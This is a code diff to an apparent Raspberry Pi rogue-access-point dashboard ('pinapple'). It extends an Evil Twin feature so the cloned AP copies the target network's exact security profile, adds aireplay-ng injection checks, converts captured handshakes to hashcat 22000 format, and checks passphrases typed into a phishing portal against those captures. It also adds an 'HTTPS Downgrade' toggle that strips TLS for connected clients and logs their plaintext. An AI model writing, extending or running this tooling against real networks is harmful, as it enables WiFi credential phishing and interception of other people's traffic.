@@ -37,6 +37,9 @@ _evil_twin_starting = [False]
 _evil_twin_error = [None]
 _twin_capture = [None]
 _twin_capture_result = [None]
+_twin_health = [None]
+_twin_portal_cache = [0.0, None]
+_twin_hash_cache = [0.0, None]
 _twin_ap_since = [0.0]
 _twin_seen_client = [False]
 TWIN_IDLE_REVERT_SECONDS = 120
@@ -63,6 +66,16 @@ SAVED_INDEX = '/var/lib/pinapple/saved.json'
 MAX_SAVED_ITEMS = 200
 HOSTAPD_CONF = '/etc/hostapd/hostapd.conf'
 EVILTWIN_BACKUP = '/etc/pinapple/hostapd-pre-eviltwin.bak'
+# Snapshot of the operator's own captive-portal settings taken before a twin
+# enables DNS hijack + HTTP redirect. Without it the twin's portal stays armed
+# after stop/reboot and locks the operator out of the dashboard on :8080.
+EVILTWIN_PORTAL_STATE = '/etc/pinapple/eviltwin-portal.json'
+# Exists only while a captive portal / Evil Twin is armed. nginx uses it to
+# decide whether port 80 serves the portal or redirects to the dashboard.
+PORTAL_ACTIVE = '/etc/pinapple/portal-active'
+# One-shot marker so the legacy portal cleanup does not keep disabling a
+# captive-portal setup the operator re-enables afterwards.
+LEGACY_PORTAL_CLEANUP = '/etc/pinapple/portal-cleanup-v1'
 # Older builds stored the AP backup as .conf inside conf-dir=/etc/pinapple,
 # which makes dnsmasq parse hostapd syntax and refuse to start. Migrated away.
 LEGACY_EVILTWIN_BACKUP = '/etc/pinapple/hostapd-pre-eviltwin.conf'
@@ -87,6 +100,14 @@ PORTAL_LABELS = {
 DEAUTH_HELPER = '/usr/local/bin/pinapple-deauth'
 BEACON_HELPER = '/usr/local/bin/pinapple-beacon-flood'
 HANDSHAKE_HELPER = '/usr/local/bin/pinapple-handshake'
+IW_BIN = shutil.which('iw') or '/usr/sbin/iw'
+PSK_VERIFY_HELPER = '/usr/local/bin/pinapple-psk-verify'
+PSK_HELPER = '/usr/local/bin/pinapple-psk-check'
+STRIP_HELPER = '/usr/local/bin/pinapple-strip'
+STRIP_PID = '/var/run/pinapple-strip.pid'
+STRIP_LOG = os.path.join(LOG_DIR, 'strip.log')
+STRIP_JSONL = os.path.join(LOG_DIR, 'strip.jsonl')
+HCXPCAPNGTOOL = 'hcxpcapngtool'
 
 def load_config():
     defaults = {
@@ -290,6 +311,7 @@ def restore_network_flags():
             subprocess.run([script, 'on'], capture_output=True, timeout=15)
         except Exception:
             pass
+    refresh_portal_active()
 
 
 def recon_active():
@@ -306,7 +328,7 @@ def wlan0_mac():
 
 def wlan0_ssid():
     try:
-        r = subprocess.run(['iw', 'dev', 'wlan0', 'info'],
+        r = subprocess.run([IW_BIN, 'dev', 'wlan0', 'info'],
                            capture_output=True, text=True, timeout=3)
     except (OSError, subprocess.SubprocessError):
         return ''
@@ -320,7 +342,8 @@ def wlan0_ssid():
 def system_checks():
     checks = []
     for name in ('mdk4', 'iw', 'airodump-ng', 'aireplay-ng', 'hcxdumptool',
-                 'hcxpcapngtool', 'nmcli', 'hostapd', 'nginx', 'tcpdump'):
+                 'hcxpcapngtool', 'nmcli', 'hostapd', 'nginx', 'tcpdump',
+                 'pinapple-strip'):
         found = shutil.which(name)
         if not found:
             for prefix in ('/usr/local/bin', '/usr/sbin', '/usr/bin', '/sbin', '/bin'):
@@ -350,7 +373,7 @@ def iface_ip(name):
 
 def monitor_mode_active():
     try:
-        r = subprocess.run(['iw', 'dev', 'wlan1', 'info'],
+        r = subprocess.run([IW_BIN, 'dev', 'wlan1', 'info'],
                            capture_output=True, text=True, timeout=5)
         return 'type monitor' in r.stdout
     except Exception:
@@ -413,19 +436,101 @@ def read_hostapd_conf():
         pass
     return cfg
 
-def write_hostapd_conf(ssid, channel, mode, txpower, passphrase=None):
+def read_country_code():
+    """Regulatory country from `iw reg get`; '' when the world domain is set."""
+    try:
+        r = subprocess.run([IW_BIN, 'reg', 'get'], capture_output=True,
+                           text=True, timeout=4)
+    except (OSError, subprocess.SubprocessError):
+        return ''
+    match = re.search(r'country ([A-Z]{2}):', r.stdout or '')
+    code = match.group(1) if match else ''
+    return '' if code in ('', '00') else code
+
+
+def write_hostapd_conf(ssid, channel, mode, txpower, passphrase=None,
+                       security=None):
+    """Write the AP config used by pinapple-ap.
+
+    For an Evil Twin the goal is not merely "same SSID": clients match the
+    security profile they saved (WPA vs RSN, pairwise cipher, PMF capability),
+    and silently refuse a clone that differs. `security` is the dict captured
+    by the monitor/scan parser, so the twin advertises the same profile.
+
+    hostapd option names: https://w1.fi/cgit/hostap/plain/hostapd/hostapd.conf
+    """
     # SSIDs come from a web form; strip control characters so a newline
     # cannot inject extra hostapd directives.
     ssid = ''.join(ch if ord(ch) >= 32 and ord(ch) != 127 else ' '
                    for ch in str(ssid or ''))[:32]
-    pwd_line = ''
-    if mode == 'wpa2':
+    security = security if isinstance(security, dict) else {}
+    key = ''
+    if mode != 'open':
         key = ''.join(ch if ord(ch) >= 32 and ord(ch) != 127 else ' '
                       for ch in str(passphrase or 'pinapple123'))[:63]
-        pwd_line = '\nwpa=2\nwpa_passphrase=%s\nwpa_key_mgmt=WPA-PSK\nrsn_pairwise=CCMP' % key
-    conf = "interface=wlan0\ndriver=nl80211\nssid={}\nhw_mode=g\nchannel={}\nieee80211n=1\n".format(ssid, channel)
-    conf += "ht_capab=[SHORT-GI-20][DSSS_CCK-40]\nwmm_enabled=1\nauth_algs=1\nignore_broadcast_ssid=0"
-    conf += pwd_line + "\n"
+
+    wpa_lines = ''
+    if key:
+        pairwise = [c for c in (security.get('pairwise') or []) if c in
+                    ('CCMP', 'TKIP', 'GCMP')]
+        if not pairwise:
+            pairwise = ['CCMP']
+        group = security.get('group')
+        if group not in ('CCMP', 'TKIP', 'GCMP'):
+            group = 'CCMP' if 'CCMP' in pairwise else pairwise[0]
+        def cipher_list(items):
+            return ' '.join(dict.fromkeys(items))
+
+        sae = bool(security.get('sae'))
+        psk_akm = bool(security.get('psk')) or not sae
+        if security.get('wpa') and security.get('rsn'):
+            wpa_version = 3
+        elif security.get('wpa') and not security.get('rsn'):
+            wpa_version = 1
+        else:
+            wpa_version = 2
+
+        akms = []
+        if psk_akm:
+            akms.append('WPA-PSK')
+        if sae and 'SAE' not in akms:
+            akms.append('SAE')
+        if not akms:
+            akms = ['WPA-PSK']
+
+        pmf = 2 if (sae or security.get('pmf') == 2) else (
+            1 if security.get('pmf') == 1 else 0)
+        wpa_lines = '\nwpa=%d\nwpa_key_mgmt=%s\n' % (wpa_version, ' '.join(akms))
+        if 'WPA-PSK' in akms:
+            wpa_lines += 'wpa_passphrase=%s\n' % key
+        if sae:
+            wpa_lines += 'sae_password=%s\nsae_require_mfp=1\n' % key
+        if wpa_version in (1, 3):
+            legacy = [c for c in pairwise if c == 'TKIP'] or pairwise
+            wpa_lines += 'wpa_pairwise=%s\n' % cipher_list(legacy)
+        if wpa_version in (2, 3):
+            wpa_lines += 'rsn_pairwise=%s\n' % cipher_list(
+                [c for c in pairwise if c != 'TKIP'] or ['CCMP'])
+        wpa_lines += 'group_cipher=%s\nieee80211w=%d\n' % (group, pmf)
+
+    beacon = security.get('beacon_int')
+    try:
+        beacon = int(beacon or 100)
+    except (TypeError, ValueError):
+        beacon = 100
+    if not 40 <= beacon <= 1000:
+        beacon = 100
+
+    conf = ("interface=wlan0\ndriver=nl80211\nssid={}\nhw_mode={}\nchannel={}\n"
+            "beacon_int={}\ndtim_period=2\n").format(
+                ssid, 'g' if channel <= 14 else 'a', channel, beacon)
+    conf += "ieee80211n=1\nht_capab=[SHORT-GI-20][DSSS_CCK-40]\n"
+    conf += "wmm_enabled=1\nauth_algs=1\nignore_broadcast_ssid=0\n"
+    conf += "ap_isolate=0\nmax_num_sta=64\n"
+    country = read_country_code()
+    if country:
+        conf += "country_code=%s\nieee80211d=1\n" % country
+    conf += wpa_lines + "\n"
     with open(HOSTAPD_CONF, 'w') as f:
         f.write(conf)
 
@@ -524,7 +629,7 @@ def read_ap_txpower():
 def apply_ap_txpower(level):
     dbm = TX_POWER_DBM.get(level, 14)
     try:
-        r = subprocess.run(['iw', 'dev', 'wlan0', 'set', 'txpower', 'fixed', str(dbm * 100)],
+        r = subprocess.run([IW_BIN, 'dev', 'wlan0', 'set', 'txpower', 'fixed', str(dbm * 100)],
                            capture_output=True, text=True, timeout=5)
         return r.returncode == 0, (r.stderr or r.stdout).strip()
     except Exception as exc:
@@ -532,7 +637,7 @@ def apply_ap_txpower(level):
 
 def get_wlan1_mode():
     try:
-        r = subprocess.run(['iw', 'dev', 'wlan1', 'info'], capture_output=True, text=True, timeout=3)
+        r = subprocess.run([IW_BIN, 'dev', 'wlan1', 'info'], capture_output=True, text=True, timeout=3)
         if r.returncode != 0:
             return 'missing'
         for line in r.stdout.splitlines():
@@ -552,7 +657,7 @@ def set_wlan1_mode(target):
         return False, f"Invalid target mode: {target}"
     try:
         subprocess.run(['ip', 'link', 'set', 'wlan1', 'down'], capture_output=True, timeout=5)
-        r = subprocess.run(['iw', 'dev', 'wlan1', 'set', 'type', target], capture_output=True, text=True, timeout=5)
+        r = subprocess.run([IW_BIN, 'dev', 'wlan1', 'set', 'type', target], capture_output=True, text=True, timeout=5)
         if r.returncode != 0:
             return False, r.stderr.strip() or 'iw set type failed'
         subprocess.run(['ip', 'link', 'set', 'wlan1', 'up'], capture_output=True, timeout=5)
@@ -663,6 +768,14 @@ def ssid_for_bssid(bssid):
     return ''
 
 
+def recon_entry(bssid):
+    target = (bssid or '').lower()
+    for network in get_recon():
+        if str(network.get('bssid', '')).lower() == target:
+            return network
+    return {}
+
+
 def resolve_channel(requested, bssid):
     """Pick the channel for a twin.
 
@@ -677,8 +790,8 @@ def resolve_channel(requested, bssid):
             channel = int(requested)
         except (TypeError, ValueError):
             return None, 'channel must be a number'
-        if not 1 <= channel <= 14:
-            return None, 'channel must be between 1 and 14'
+        if not 1 <= channel <= 196:
+            return None, 'channel must be between 1 and 196'
         if scanned and scanned != channel:
             return scanned, None
         return channel, None
@@ -689,7 +802,7 @@ def set_wlan1_channel(channel):
     if not channel:
         return True, ''
     try:
-        r = subprocess.run(['iw', 'dev', 'wlan1', 'set', 'channel', str(channel)],
+        r = subprocess.run([IW_BIN, 'dev', 'wlan1', 'set', 'channel', str(channel)],
                            capture_output=True, text=True, timeout=5)
         if r.returncode != 0:
             return False, (r.stderr or r.stdout).strip() or 'iw set channel failed'
@@ -739,16 +852,41 @@ def freq_to_channel(freq):
 
 
 def parse_iw_scan(text):
-    """Parse `iw dev wlan1 scan` output into the dashboard's recon schema."""
+    """Parse `iw dev wlan1 scan` output into the dashboard's recon schema.
+
+    Besides the label, keep the RSN detail (ciphers, AKM, PMF, WPS) so an Evil
+    Twin can clone what clients actually match on instead of guessing.
+    """
     networks = []
     current = None
 
+    def ensure_security():
+        sec = current.get('security')
+        if not isinstance(sec, dict):
+            sec = {'rsn': False, 'wpa': False, 'wps': False, 'group': '',
+                   'pairwise': [], 'akm': [], 'pmf': 0, 'sae': False,
+                   'psk': False, 'eap': False}
+            current['security'] = sec
+        return sec
+
     def finish():
-        if current and valid_mac(current['bssid']):
-            if current.get('privacy') and current['encryption'] == 'Open':
-                current['encryption'] = 'WEP'
-            current.pop('privacy', None)
-            networks.append(current)
+        if not (current and valid_mac(current['bssid'])):
+            return
+        sec = ensure_security()
+        sec['sae'] = any(a in ('SAE', 'FT-SAE') for a in sec['akm'])
+        sec['psk'] = any(a in ('PSK', 'FT-PSK', 'PSK-SHA256') for a in sec['akm'])
+        sec['eap'] = any(a.startswith('802.1X') for a in sec['akm'])
+        if sec['sae']:
+            current['encryption'] = 'WPA3'
+        elif sec['rsn']:
+            current['encryption'] = 'WPA2'
+        elif sec['wpa']:
+            current['encryption'] = 'WPA'
+        if current.get('privacy') and current['encryption'] == 'Open':
+            current['encryption'] = 'WEP'
+        current.pop('privacy', None)
+        current['band'] = '2.4' if 0 < current.get('channel', 0) <= 14 else '5'
+        networks.append(current)
 
     for line in (text or '').splitlines():
         stripped = line.strip()
@@ -765,6 +903,11 @@ def parse_iw_scan(text):
             channel = freq_to_channel(stripped.split(':', 1)[1])
             if channel:
                 current['channel'] = channel
+        elif stripped.startswith('beacon interval:'):
+            try:
+                current['beacon_int'] = int(stripped.split(':', 1)[1].split()[0])
+            except (IndexError, ValueError):
+                pass
         elif stripped.startswith('signal:'):
             try:
                 current['signal'] = int(float(stripped.split(':', 1)[1].split()[0]))
@@ -774,13 +917,28 @@ def parse_iw_scan(text):
             current['ssid'] = re.sub(r'[\x00-\x1f\x7f]+', ' ',
                                      stripped.split(':', 1)[1]).strip()
         elif stripped.startswith('RSN:'):
-            current['encryption'] = 'WPA2'
+            ensure_security()['rsn'] = True
         elif stripped.startswith('WPA:'):
-            if current['encryption'] == 'Open':
-                current['encryption'] = 'WPA'
+            ensure_security()['wpa'] = True
+        elif stripped.startswith('WPS:'):
+            ensure_security()['wps'] = True
+        elif 'Group cipher:' in stripped:
+            ensure_security()['group'] = stripped.split(':', 1)[1].strip()
+        elif 'Pairwise ciphers:' in stripped:
+            ensure_security()['pairwise'] = [
+                item.strip() for item in
+                stripped.split(':', 1)[1].split() if item.strip()]
         elif 'Authentication suites:' in stripped:
-            if 'SAE' in stripped:
-                current['encryption'] = 'WPA3'
+            ensure_security()['akm'] = [
+                item.strip() for item in
+                stripped.split(':', 1)[1].split() if item.strip()]
+        elif 'Capabilities:' in stripped:
+            caps = stripped.split(':', 1)[1]
+            sec = ensure_security()
+            if 'MFP-required' in caps:
+                sec['pmf'] = 2
+            elif 'MFP-capable' in caps:
+                sec['pmf'] = 1
         elif stripped.startswith('capability:'):
             if 'Privacy' in stripped:
                 current['privacy'] = True
@@ -834,7 +992,7 @@ def scan_wlan1_with_iw():
     if not shutil.which('iw'):
         return [], 'iw is not installed'
     try:
-        r = subprocess.run(['iw', 'dev', 'wlan1', 'scan'],
+        r = subprocess.run([IW_BIN, 'dev', 'wlan1', 'scan'],
                            capture_output=True, text=True, timeout=25)
     except (OSError, subprocess.SubprocessError) as exc:
         return [], str(exc)
@@ -872,6 +1030,119 @@ def deauth_command(bssid, client, channel, rate, continuous=False, count=10):
     if continuous:
         cmd += ['--continuous']
     return cmd
+
+
+def iface_tx_packets(interface='wlan1'):
+    """Kernel TX counter, used to prove frames actually left the adapter."""
+    try:
+        with open('/sys/class/net/%s/statistics/tx_packets' % interface) as f:
+            return int(f.read().strip())
+    except (OSError, ValueError):
+        return None
+
+
+def wait_for_tx(interface, baseline, timeout=2.0):
+    """True when the TX counter moved since `baseline` (None = unreadable)."""
+    if baseline is None:
+        return None
+    deadline = time.time() + timeout
+    while time.time() < deadline:
+        now = iface_tx_packets(interface)
+        if now is not None and now > baseline:
+            return True
+        time.sleep(0.2)
+    return False
+
+
+_injection_cache = [0.0, None, '']
+
+
+def injection_test_channel():
+    """A 2.4 GHz channel where an AP is known to answer probe requests.
+
+    aireplay-ng's injection test needs an AP to reply. The target channel may
+    hold only our own AP (or a quiet one), which produces a false "no APs"
+    failure, so test on the busiest scanned channel instead: injection
+    capability is not channel-specific for 2.4 GHz.
+    """
+    counts = {}
+    try:
+        for network in get_recon():
+            try:
+                channel = int(network.get('channel') or 0)
+            except (TypeError, ValueError):
+                continue
+            if 1 <= channel <= 13:
+                counts[channel] = counts.get(channel, 0) + 1
+    except Exception:
+        counts = {}
+    for channel in (1, 6, 11):
+        if counts.get(channel):
+            return channel
+    if counts:
+        return max(counts, key=counts.get)
+    return 1
+
+
+def verify_injection(interface='wlan1', timeout=6.0, force=False):
+    """Prove the adapter can inject, using aireplay-ng's ping test.
+
+    The ath9k_htc TX counter does not increment for injected monitor-mode
+    frames, so `tx_packets` alone produces false "no injection" failures. The
+    canonical test is `aireplay-ng --test`: it sends probe requests and waits
+    for AP responses. Success is a Ping summary line. Run on a channel with a
+    known AP and cache the result for two minutes.
+    """
+    now = time.time()
+    if not force and now - _injection_cache[0] < 120 and _injection_cache[1] is not None:
+        return _injection_cache[1], _injection_cache[2]
+    tool = shutil.which('aireplay-ng') or '/usr/sbin/aireplay-ng'
+    if not os.path.exists(tool):
+        _injection_cache[:] = [now, False, 'aireplay-ng is not installed (aircrack-ng)']
+        return False, _injection_cache[2]
+    ok, detail = False, 'aireplay-ng could not inject'
+    for channel in dict.fromkeys([injection_test_channel(), 1, 6, 11]):
+        try:
+            set_wlan1_channel(channel)
+        except Exception:
+            pass
+        try:
+            proc = subprocess.Popen([tool, '--test', interface],
+                                    stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+                                    text=True, start_new_session=True)
+        except OSError as exc:
+            _injection_cache[:] = [now, False, 'could not run aireplay-ng: %s' % exc]
+            return False, _injection_cache[2]
+        output = ''
+        try:
+            output, _ = proc.communicate(timeout=timeout)
+        except subprocess.TimeoutExpired:
+            terminate_process_group(proc)
+            try:
+                output, _ = proc.communicate(timeout=3)
+            except subprocess.SubprocessError:
+                output = ''
+        text = output or ''
+        if 'Ping (min/avg/max)' in text or 'Injection is working' in text:
+            ok, detail = True, 'aireplay-ng confirmed injection (ch %d)' % channel
+            break
+        tail = ' '.join(text.strip().splitlines()[-2:])[:160]
+        detail = ('aireplay-ng could not inject on ch %d: %s'
+                  % (channel, tail or 'no AP answered the probe test'))
+    _injection_cache[:] = [now, ok, detail]
+    return ok, detail
+
+
+def hostapd_accepts_channel(channel):
+    """Channels 12-13 need a regulatory domain; without one hostapd refuses."""
+    if 1 <= channel <= 11:
+        return True, ''
+    if channel == 14:
+        return False, 'channel 14 is not supported by hostapd on this hardware'
+    if read_country_code():
+        return True, ''
+    return False, ('channels 12-13 need a regulatory country code; set one with '
+                   '`raspi-config`/`iw reg set` or use channel 1-11')
 
 
 def terminate_process_group(proc, timeout=3):
@@ -930,6 +1201,14 @@ def pid_alive(pid, marker):
         return False
 
 
+def _read_pid_file(path):
+    try:
+        with open(path) as handle:
+            return int(handle.read().strip())
+    except (OSError, ValueError):
+        return None
+
+
 def read_json_file(path, default):
     try:
         with open(path) as f:
@@ -980,6 +1259,161 @@ def saved_path(item):
     if not path.startswith(base + os.sep):
         return None
     return path if os.path.exists(path) else None
+
+
+def convert_pcap_to_22000(pcap_path, out_path=None):
+    """Convert a capture with hcxpcapngtool; returns (path, error)."""
+    tool = shutil.which(HCXPCAPNGTOOL)
+    if not tool:
+        return None, 'hcxpcapngtool is not installed (apt install hcxtools)'
+    if not pcap_path or not os.path.exists(pcap_path):
+        return None, 'capture file does not exist'
+    out_path = out_path or (pcap_path.rsplit('.', 1)[0] + '.22000')
+    try:
+        r = subprocess.run([tool, '-o', out_path, pcap_path],
+                           capture_output=True, text=True, timeout=90)
+    except (OSError, subprocess.SubprocessError) as exc:
+        return None, 'hcxpcapngtool failed: %s' % exc
+    if not os.path.exists(out_path) or os.path.getsize(out_path) == 0:
+        try:
+            os.remove(out_path)
+        except OSError:
+            pass
+        detail = (r.stderr or r.stdout or '').strip().splitlines()
+        return None, ('no handshake found in the capture'
+                      + (': ' + detail[-1][:160] if detail else ''))
+    return out_path, ''
+
+
+def hash_file_has_bssid(path, bssid_hex):
+    """True when a 22000 file contains a line for this AP MAC."""
+    if not bssid_hex:
+        return True
+    wanted = bssid_hex.lower()
+    try:
+        with open(path, errors='ignore') as handle:
+            for line in handle:
+                parts = line.strip().split('*')
+                if len(parts) >= 5 and parts[0] == 'WPA' and \
+                        parts[1] in ('01', '02') and parts[3].lower() == wanted:
+                    return True
+    except OSError:
+        return False
+    return False
+
+
+def find_hash_for_bssid(bssid, ssid=''):
+    """Newest Saved/live capture that can verify a passphrase for this AP.
+
+    Prefers a converted .22000 (fast, no radio); falls back to a Saved .pcap
+    that the verifier can convert on demand.
+    """
+    bssid_hex = re.sub(r'[^0-9a-fA-F]', '', str(bssid or ''))
+    candidates = []
+
+    # A twin may still be capturing. Convert the live pcap on demand so the
+    # portal can verify offline as soon as the client's handshake is on disk,
+    # instead of waiting for the twin to stop.
+    active = _twin_capture[0]
+    if active and active.get('path') and os.path.exists(active['path']):
+        live = active['path'].rsplit('.', 1)[0] + '.live.22000'
+        try:
+            fresh = (os.path.exists(live) and
+                     time.time() - os.path.getmtime(live) < 8)
+            if not fresh:
+                convert_pcap_to_22000(active['path'], live)
+            if os.path.exists(live) and os.path.getsize(live) > 0:
+                candidates.append(('22000', live, os.path.getmtime(live)))
+        except Exception:
+            pass
+
+    # Live twin captures are converted at stop, but a previous twin may have
+    # left a usable .22000 in the log directory.
+    try:
+        for name in os.listdir(LOG_DIR):
+            if not name.endswith(('.22000', '.hc22000')):
+                continue
+            path = os.path.join(LOG_DIR, name)
+            candidates.append(('22000', path, os.path.getmtime(path)))
+    except OSError:
+        pass
+
+    for item in saved_items()[:60]:
+        path = saved_path(item)
+        if not path:
+            continue
+        kind = '22000' if path.lower().endswith(('.22000', '.hc22000')) else (
+            'pcap' if path.lower().endswith(('.pcap', '.cap')) else '')
+        if not kind:
+            continue
+        try:
+            mtime = os.path.getmtime(path)
+        except OSError:
+            continue
+        candidates.append((kind, path, mtime))
+
+    pcap_bssid = {}
+    for item in saved_items()[:60]:
+        item_path = saved_path(item)
+        if item_path:
+            pcap_bssid[item_path] = str((item.get('meta') or {}).get('bssid', ''))
+
+    candidates.sort(key=lambda row: row[2], reverse=True)
+    for kind, path, _mtime in candidates:
+        if kind == '22000':
+            if hash_file_has_bssid(path, bssid_hex):
+                return {'kind': kind, 'path': path}
+        else:
+            item_bssid = pcap_bssid.get(path, '')
+            if not bssid_hex or not item_bssid or \
+                    re.sub(r'[^0-9a-fA-F]', '', item_bssid).lower() == bssid_hex.lower():
+                return {'kind': kind, 'path': path}
+    return None
+
+
+def verify_psk_offline(psk, ssid='', bssid=''):
+    """Check one typed passphrase against a stored capture, without the radio."""
+    found = find_hash_for_bssid(bssid, ssid)
+    if not found:
+        return {'result': 'no-hash',
+                'detail': 'no handshake/PMKID capture for this network yet'}
+    helper = PSK_VERIFY_HELPER
+    if not os.path.exists(helper):
+        local = os.path.join(os.path.dirname(os.path.abspath(__file__)),
+                             'tools', 'pinapple-psk-verify')
+        if os.path.exists(local):
+            helper = local
+        else:
+            return {'result': 'error',
+                    'detail': 'pinapple-psk-verify is not installed (re-run install.sh)'}
+    cmd = [sys.executable, helper, '--passphrase', '-']
+    if found['kind'] == 'pcap':
+        cmd += ['--pcap', found['path']]
+    else:
+        cmd += ['--hash-file', found['path']]
+    if bssid:
+        cmd += ['--bssid', bssid]
+    if ssid:
+        cmd += ['--ssid', ssid]
+    try:
+        r = subprocess.run(cmd, input=(psk + '\n'), capture_output=True,
+                           text=True, timeout=150)
+    except (OSError, subprocess.SubprocessError) as exc:
+        return {'result': 'error', 'detail': 'verifier failed: %s' % exc}
+    payload = {}
+    for line in (r.stdout or '').strip().splitlines():
+        try:
+            payload = json.loads(line)
+        except ValueError:
+            continue
+    if not payload:
+        detail = (r.stderr or r.stdout or 'verifier produced no result').strip()
+        return {'result': 'error',
+                'detail': detail.splitlines()[-1][:200] if detail else 'no result'}
+    payload.setdefault('method', '')
+    payload['source'] = found['kind']
+    payload['elapsed_ms'] = payload.get('elapsed_ms', 0)
+    return payload
 
 
 def saved_add(kind, title, src_path=None, payload=None, ext='bin',
@@ -1191,7 +1625,8 @@ def stop_wlan1_jobs(except_owner=None):
     if except_owner != 'eviltwin':
         was_twin = bool(_evil_twin_job[0] is not None or
                         os.path.exists(EVILTWIN_BACKUP) or
-                        os.path.exists(EVILTWIN_STATE))
+                        os.path.exists(EVILTWIN_STATE) or
+                        os.path.exists(EVILTWIN_PORTAL_STATE))
         if _evil_twin_job[0] is not None:
             terminate_process_group(_evil_twin_job[0])
             _evil_twin_job[0] = None
@@ -1264,6 +1699,14 @@ def restore_ap_after_eviltwin(reason=''):
     """Restore the user's original wlan0 AP after an Evil Twin run."""
     _twin_capture_stop()
     state = read_json_file(EVILTWIN_STATE, {})
+
+    # A dashboard restart can leave the deauth helper alive. Kill it before
+    # restoring the AP, otherwise it keeps kicking the operator off the real
+    # network after the twin config is gone.
+    for pid in (state.get('pid'), _read_pid_file(EVILTWIN_PID)):
+        if pid:
+            safe_kill_pid(pid, 'pinapple-deauth')
+
     for path in (EVILTWIN_PID, EVILTWIN_STATE):
         try:
             os.remove(path)
@@ -1298,6 +1741,8 @@ def restore_ap_after_eviltwin(reason=''):
     except OSError as exc:
         audit('Could not restore hostapd config after Evil Twin: %s' % exc, 'error')
 
+    restore_twin_portal(reason or 'twin stopped')
+
     try:
         subprocess.run(['systemctl', 'start', 'pinapple-ap'],
                        capture_output=True, text=True, timeout=10)
@@ -1312,18 +1757,27 @@ def restore_ap_after_eviltwin(reason=''):
 def reconcile_eviltwin_state():
     """Recover safely if the dashboard died during an Evil Twin run.
 
-    An Evil Twin must never outlive a reboot/restart. If its deauth helper is
-    gone, restore the backed-up AP config and clean the state files.
+    An Evil Twin must never outlive a reboot/restart: the clone owns wlan0, so
+    leaving it up also leaves the operator locked out of the AP. Always put the
+    real AP back on dashboard start, even if the deauth helper is still alive.
     """
-    if not os.path.exists(EVILTWIN_STATE) and not os.path.exists(EVILTWIN_BACKUP):
+    if os.path.exists(EVILTWIN_STATE) or os.path.exists(EVILTWIN_BACKUP):
+        audit('Recovering from an interrupted Evil Twin run', 'warn')
+        release_wlan1('eviltwin')
+        restore_ap_after_eviltwin('dashboard restart')
         return
-    state = read_json_file(EVILTWIN_STATE, {})
-    pid = state.get('pid')
-    if pid and pid_alive(pid, 'pinapple-deauth'):
+    if os.path.exists(EVILTWIN_PORTAL_STATE):
+        restore_twin_portal('dashboard restart')
         return
-    audit('Recovering from an interrupted Evil Twin run', 'warn')
-    release_wlan1('eviltwin')
-    restore_ap_after_eviltwin('dashboard restart')
+    # One-time cleanup for installs that ran the old code: it enabled the
+    # portal hijack without a snapshot and left it armed after the twin.
+    if legacy_twin_portal_leftover():
+        audit('Clearing a leftover Evil Twin portal hijack', 'warn')
+        restore_twin_portal('legacy leftover')
+        try:
+            open(LEGACY_PORTAL_CLEANUP, 'w').close()
+        except OSError:
+            pass
 
 
 def cleanup_orphan_handshakes():
@@ -1675,6 +2129,7 @@ NAV = """<aside class="sidebar">
     <a href="/creds" class="{cr}">🔑 Credentials</a>
     <a href="/saved" class="{sv}">💾 Saved</a>
     <a href="/logs" class="{lo}">📝 Logs</a>
+    <a href="/strip" class="{sp}">🕵️ Intercept</a>
     <a href="/ap-control" class="{ap}">📶 AP Control</a>
     <a href="/settings" class="{se}">⚙️ Settings</a>
 
@@ -2021,8 +2476,8 @@ labelTables();
 </script>{js}</body></html>"""
 
 def page(title, content, active='', js=''):
-    acts = {k: '' for k in ['ov','cl','re','cr','ap','lo','se','da','hs','et','pm','bf','tr','pr','sv']}
-    m = {'overview':'ov','clients':'cl','recon':'re','creds':'cr','ap':'ap','logs':'lo','settings':'se','wl':'da','deauth':'da','handshake':'hs','eviltwin':'et','pmkid':'pm','beacon':'bf','tracker':'tr','probes':'pr','saved':'sv'}
+    acts = {k: '' for k in ['ov','cl','re','cr','ap','lo','se','da','hs','et','pm','bf','tr','pr','sv','sp']}
+    m = {'overview':'ov','clients':'cl','recon':'re','creds':'cr','ap':'ap','logs':'lo','settings':'se','wl':'da','deauth':'da','handshake':'hs','eviltwin':'et','pmkid':'pm','beacon':'bf','tracker':'tr','probes':'pr','saved':'sv','strip':'sp'}
     if active in m:
         acts[m[active]] = 'active'
     return BASE.format(title=title, css=CSS, nav=NAV.format(**acts), content=content, js=js)
@@ -2054,6 +2509,7 @@ def overview():
     i_on = os.path.exists(FLAG_INTERNET)
     d_on = os.path.exists(FLAG_DNS)
     p_on = os.path.exists(FLAG_PORTAL)
+    s_on = strip_active()
     try:
         uptime = subprocess.run(['uptime', '-p'], capture_output=True, text=True,
                                 timeout=5).stdout.strip()
@@ -2125,6 +2581,8 @@ def overview():
   <button class="tbtn {dc}" onclick="tog('dns-hijack',this)">{dt}</button></div>
 <div class="tg"><div class="tl"><strong>Portal Redirect</strong><span>Redirect HTTP (port 80) to the portal</span></div>
   <button class="tbtn {pc}" onclick="tog('portal-redirect',this)">{pt}</button></div>
+<div class="tg"><div class="tl"><strong>HTTPS Downgrade</strong><span>Strip TLS for AP clients &middot; logs plaintext</span></div>
+  <button class="tbtn {sc}" onclick="togStrip(this)">{st}</button></div>
 </div>
 <div>
 <div class="sh"><span class="st">Interfaces</span></div>
@@ -2145,6 +2603,7 @@ def overview():
         ic='ton' if i_on else 'toff', it='ON' if i_on else 'OFF',
         dc='ton' if d_on else 'toff', dt='ON' if d_on else 'OFF',
         pc='ton' if p_on else 'toff', pt='ON' if p_on else 'OFF',
+        sc='ton' if s_on else 'toff', st='ON' if s_on else 'OFF',
         eip=html_escape(str(eth_ip)), ethb='bg' if eth_ip != '—' else 'br',
         w0ip=html_escape(str(wlan0_ip)),
         apb='bg' if ap_ok else 'br', aps='AP' if ap_ok else 'DOWN',
@@ -2163,6 +2622,20 @@ async function tog(f,btn){
     toast((act==='on'?'Enabled ':'Disabled ')+f,'success');
   } else {
     toast('Error: '+(r.error||'unknown'),'error',6000);
+  }
+}
+async function togStrip(btn){
+  const on=btn.classList.contains('ton');
+  if(!on && !confirm('Start the HTTPS downgrade?\\n\\nDNS Hijack and Portal Redirect will be turned off so port 80 reaches the strip proxy. The AP stays up.')) return;
+  busy(btn,true);
+  const r=await api('/api/strip/'+(on?'stop':'start'),'POST',{});
+  busy(btn,false);
+  if(r&&r.ok){
+    btn.textContent=on?'OFF':'ON';
+    btn.className='tbtn '+(on?'toff':'ton');
+    toast(on?'HTTPS downgrade off':'HTTPS downgrade on','success');
+  } else {
+    toast('Error: '+((r&&r.error)||'unknown'),'error',7000);
   }
 }
 async function repairServices(btn){
@@ -2189,6 +2662,18 @@ def api_toggle(feature):
     if action not in ('on', 'off'):
